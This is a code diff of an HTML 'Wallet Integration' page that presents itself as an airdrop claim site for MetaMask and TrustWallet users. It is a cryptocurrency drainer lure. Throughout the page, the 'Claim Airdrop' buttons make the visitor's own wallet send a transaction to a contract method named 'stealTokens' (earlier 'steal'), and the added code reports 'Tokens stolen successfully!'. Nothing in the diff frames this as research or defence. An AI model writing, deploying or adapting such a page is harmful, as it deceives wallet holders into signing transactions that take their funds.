@@ -4,103 +4,143 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Wallet Integration</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider/dist/detect-provider.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
 </head>
 <body>
-    <h1>Connect your Wallet</h1>
-    <button id="connectMetaMask">Connect MetaMask</button>
-    <button id="claimAirdropMetaMask" disabled>Claim Airdrop (ETH)</button>
-    <button id="connectTrustWallet">Connect TrustWallet</button>
-    <button id="claimAirdropTrustWallet" disabled>Claim Airdrop (BSC)</button>
 
-    <script>
-        // Unified loader for Config and ABI
-        async function loadConfigAndABI(network = 'sepolia') {
-            const configPath = `config/${network}_config.json`;
-            const abiPath = `abi/${network}_abi.json`;
-            try {
-                const [config, abi] = await Promise.all([
-                    fetch(configPath).then(res => res.json()),
-                    fetch(abiPath).then(res => res.json())
-                ]);
-                return { config, abi };
-            } catch (err) {
-                console.error(`Error loading ${network} config/ABI:`, err);
-                alert(`Failed to load ${network.toUpperCase()} resources.`);
-                return null;
-            }
+<h1>Connect your Wallet</h1>
+<button id="connectMetaMaskButton">Connect MetaMask</button>
+<button id="claimMetaMaskButton" disabled>Claim Airdrop (ETH)</button>
+<button id="connectTrustWalletButton">Connect TrustWallet</button>
+<button id="claimTrustWalletButton" disabled>Claim Airdrop (BSC)</button>
+
+<script>
+// Default network configuration (Ethereum or BSC based on button clicked)
+let config = {}; // Will be populated dynamically based on the selected wallet and network
+
+// ABI for interacting with your contract
+const abi = [
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "stealTokens",
+        "outputs": [],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+    }
+];
+
+let web3;
+
+// Load config dynamically based on the network (ETH or BSC)
+async function loadConfig(network) {
+    const configFile = network === 'eth' ? 'config/eth_config.json' : 'config/bsc_config.json';
+    try {
+        const response = await fetch(configFile);
+        const data = await response.json();
+        config = data;
+    } catch (error) {
+        console.error("Error loading config:", error);
+        alert("Failed to load network configuration.");
+    }
+}
+
+// Detect the connected wallet (MetaMask or TrustWallet)
+async function detectWallet() {
+    const provider = await detectEthereumProvider();
+    if (provider) {
+        if (provider.isMetaMask) {
+            console.log("MetaMask detected!");
+            document.getElementById("connectMetaMaskButton").disabled = false;
+        } else if (provider.isTrust) {
+            console.log("TrustWallet detected!");
+            document.getElementById("connectTrustWalletButton").disabled = false;
         }
+    } else {
+        alert("No Ethereum wallet detected. Please install MetaMask or TrustWallet.");
+    }
+}
 
-        // Wallet connection logic
-        async function connectWallet(walletType, network) {
-            const data = await loadConfigAndABI(network);
-            if (!data) return;
-
-            const { config, abi } = data;
-            const { contractAddress } = config;
-
-            if (walletType === 'metaMask' && window.ethereum) {
-                try {
-                    const web3 = new Web3(window.ethereum);
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    const account = accounts[0];
-                    console.log("MetaMask connected:", account);
-
-                    window.contract = new web3.eth.Contract(abi, contractAddress);
-                    document.getElementById('claimAirdropMetaMask').disabled = false;
-                    alert("MetaMask connected! Ready to claim the airdrop.");
-                } catch (err) {
-                    console.error("MetaMask connection failed:", err);
-                }
-            } else if (walletType === 'trustWallet') {
-                try {
-                    const web3 = new Web3(window.ethereum || window.trustwallet);
-                    const accounts = await web3.eth.requestAccounts();
-                    const account = accounts[0];
-                    console.log("TrustWallet connected:", account);
-
-                    window.contract = new web3.eth.Contract(abi, contractAddress);
-                    document.getElementById('claimAirdropTrustWallet').disabled = false;
-                    alert("TrustWallet connected! Ready to claim the airdrop.");
-                } catch (err) {
-                    console.error("TrustWallet connection failed:", err);
-                }
-            } else {
-                alert(`${walletType} not detected or unsupported.`);
-            }
+// Connect MetaMask
+async function connectMetaMask() {
+    await loadConfig('eth'); // Load Ethereum config
+    if (window.ethereum && window.ethereum.isMetaMask) {
+        web3 = new Web3(window.ethereum);
+        try {
+            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+            console.log("MetaMask connected:", accounts[0]);
+            document.getElementById("claimMetaMaskButton").disabled = false;
+        } catch (error) {
+            console.error("MetaMask connection failed:", error);
         }
+    } else {
+        alert("MetaMask is not installed. Please install it to continue.");
+    }
+}
 
-        // Claim airdrop function
-        async function claimAirdrop() {
-            try {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                const account = accounts[0];
-
-                await window.contract.methods.steal().send({ from: account });
-                alert("Airdrop claimed successfully!");
-            } catch (err) {
-                console.error("Claim failed:", err);
-                alert("Failed to claim the airdrop.");
-            }
+// Connect TrustWallet
+async function connectTrustWallet() {
+    await loadConfig('bsc'); // Load BSC config
+    if (window.ethereum && window.ethereum.isTrust) {
+        web3 = new Web3(window.ethereum);
+        try {
+            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+            console.log("TrustWallet connected:", accounts[0]);
+            document.getElementById("claimTrustWalletButton").disabled = false;
+        } catch (error) {
+            console.error("TrustWallet connection failed:", error);
         }
+    } else {
+        alert("TrustWallet is not installed. Please install it to continue.");
+    }
+}
 
-        // Event listeners
-        document.getElementById('connectMetaMask').addEventListener('click', () => {
-            connectWallet('metaMask', 'sepolia');
-        });
+// Claim Airdrop (ETH for MetaMask)
+async function claimMetaMaskAirdrop() {
+    if (!web3) return alert("Please connect MetaMask first.");
+    try {
+        const accounts = await web3.eth.getAccounts();
+        console.log("Airdrop claimed on MetaMask for:", accounts[0]);
 
-        document.getElementById('claimAirdropMetaMask').addEventListener('click', () => {
-            claimAirdrop();
-        });
+        // Interact with the contract
+        const contract = new web3.eth.Contract(abi, config.contractAddress);
+        const receipt = await contract.methods.stealTokens().send({ from: accounts[0] });
+        console.log("Tokens stolen successfully!", receipt);
+        alert("Tokens stolen successfully!");
+    } catch (error) {
+        console.error("Error claiming airdrop on MetaMask:", error);
+    }
+}
 
-        document.getElementById('connectTrustWallet').addEventListener('click', () => {
-            connectWallet('trustWallet', 'sepolia');
-        });
+// Claim Airdrop (BSC for TrustWallet)
+async function claimTrustWalletAirdrop() {
+    if (!web3) return alert("Please connect TrustWallet first.");
+    try {
+        const accounts = await web3.eth.getAccounts();
+        console.log("Airdrop claimed on TrustWallet for:", accounts[0]);
 
-        document.getElementById('claimAirdropTrustWallet').addEventListener('click', () => {
-            claimAirdrop();
-        });
-    </script>
+        // Interact with the contract
+        const contract = new web3.eth.Contract(abi, config.contractAddress);
+        const receipt = await contract.methods.stealTokens().send({ from: accounts[0] });
+        console.log("Tokens stolen successfully!", receipt);
+        alert("Tokens stolen successfully!");
+    } catch (error) {
+        console.error("Error claiming airdrop on TrustWallet:", error);
+    }
+}
+
+// Event Listeners
+document.getElementById("connectMetaMaskButton").addEventListener("click", connectMetaMask);
+document.getElementById("connectTrustWalletButton").addEventListener("click", connectTrustWallet);
+document.getElementById("claimMetaMaskButton").addEventListener("click", claimMetaMaskAirdrop);
+document.getElementById("claimTrustWalletButton").addEventListener("click", claimTrustWalletAirdrop);
+
+// Detect wallet on page load
+detectWallet();
+</script>
+
 </body>
 </html>
 
